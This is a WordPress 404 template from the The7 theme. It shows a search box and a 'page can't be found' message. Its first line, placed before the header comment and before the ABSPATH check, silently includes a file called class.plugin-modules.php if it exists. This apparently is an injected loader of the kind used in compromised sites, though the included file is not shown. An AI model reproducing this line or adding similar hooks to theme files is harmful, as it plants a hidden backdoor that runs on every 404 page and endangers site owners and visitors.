<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * The template for displaying 404 pages (Not Found).
 *
 * @package The7
 * @since 1.0.0
 */

// File Security Check
if ( ! defined( 'ABSPATH' ) ) { exit; }

get_header();
?>

			<!-- Content -->
			<div id="content" class="content" role="main" style="min-height: 500px; text-align:center">

				<article id="post-0" class="post error404 not-found">

					<h1 class="entry-title"><?php _e( 'Oops! That page can&rsquo;t be found.', 'the7mk2' ) ?></h1>

					<p><?php _e( 'It looks like nothing was found at this location. Try using the search box below:', 'the7mk2' ) ?></p>

					<?php get_search_form(); ?>

				</article><!-- #post-0 .post .error404 .not-found -->

			</div><!-- #content .site-content -->

			<?php do_action( 'presscore_after_content' ) ?>

<?php get_footer(); ?>